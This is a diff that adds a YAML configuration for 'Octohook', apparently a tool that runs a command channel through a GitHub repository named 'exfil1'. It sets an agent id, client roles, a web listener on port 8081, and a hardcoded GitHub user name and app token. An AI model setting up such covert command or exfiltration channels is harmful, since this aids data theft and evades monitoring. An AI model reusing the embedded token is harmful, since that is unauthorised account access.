@@ -1,0 +1,51 @@
+---
+# General operating directives
+boot: &boot
+   # Internal Queue # requests/responses (modify with care)
+   queue_watermark: 1000
+   # What is out unique opertional agent id
+   agentid: 'a932e9f5'
+
+# Octohook client side roles: has a command service and an optional web service
+# Octohook server side roles: has a command service and a web service
+roles:
+   # Web service can operate as both roles: {client|server}
+   web:
+      client: True
+      server: False
+   # Command service mutually exclusive role: <client|server>
+   cmd: 'client'
+
+# Directives to guide interface with Github API
+github: &github
+   # Github Repo
+   git_repo_name: 'exfil1' 
+   # Github User name allowed to Github repo
+   git_user_name: 'drtkn'
+   # Github app toekn to be used in place of passwords 
+   # See: https://github.com/settings/tokens
+   git_app_token: 'cb07d47ed051d071386c49f9ac34cd30272390e4' 
+
+# Directives for the client side
+client:
+   general:
+      github: *github
+      boot: *boot
+   # Specify how the webserver will bootstrap
+   web:
+      # IP to listen on
+      host: 0.0.0.0
+      # Port to listen on
+      port: 8081
+      # We want to run embedded bottle webserver thread as daemon, 
+      # no need to see messages from it
+      quiet: True
+      # Enable debugging of bottle if you need to
+      debug: False
+      # Communicating securely to Github
+      # Use scripts in `util` to generate the needed keys
+      certificate: 'keys/server.pem'
+   cmd:
+      # Where supported request templates are stored
+      template_dir: "./templates"
+
